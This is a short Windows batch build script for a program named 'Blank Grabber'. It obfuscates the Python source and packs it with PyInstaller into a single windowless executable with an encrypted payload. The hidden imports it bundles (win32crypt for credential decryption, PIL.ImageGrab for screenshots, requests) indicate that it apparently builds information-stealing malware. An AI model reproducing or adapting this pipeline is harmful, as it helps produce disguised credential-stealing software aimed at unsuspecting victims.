@echo off
if not exist activate.bat exit
title Obfuscating...
python ooo.py
title Converting to exe...
goto convert
:icon
pyinstaller --onefile --noconsole --noconfirm main-o.py --name "Blank Grabber" --icon icon.ico --clean --hidden-import requests --hidden-import PIL.Image --hidden-import PIL.ImageGrab --hidden-import PIL.ImageStat --hidden-import pyaes --hidden-import win32crypt --hidden-import json --hidden-import urllib3 --add-data cm.bam.aes;. --add-data a.es;. --add-data config.json;. --add-data ck.bam.aes;. --add-data pm.bam.aes;. --key %random%%random%%random%5 --version-file version.txt
goto done
:noicon
pyinstaller --onefile --noconsole --noconfirm main-o.py --name "Blank Grabber" --i NONE --clean --hidden-import requests --hidden-import PIL.Image --hidden-import PIL.ImageGrab --hidden-import PIL.ImageStat --hidden-import pyaes --hidden-import win32crypt --hidden-import json --hidden-import urllib3 --add-data cm.bam.aes;. --add-data a.es;. --add-data config.json;. --add-data ck.bam.aes;. --add-data pm.bam.aes;. --key %random%%random%%random%5 --version-file version.txt
goto done
:convert
if exist icon.ico goto icon
goto noicon
:done
cls
title Opening Folder...
explorer.exe dist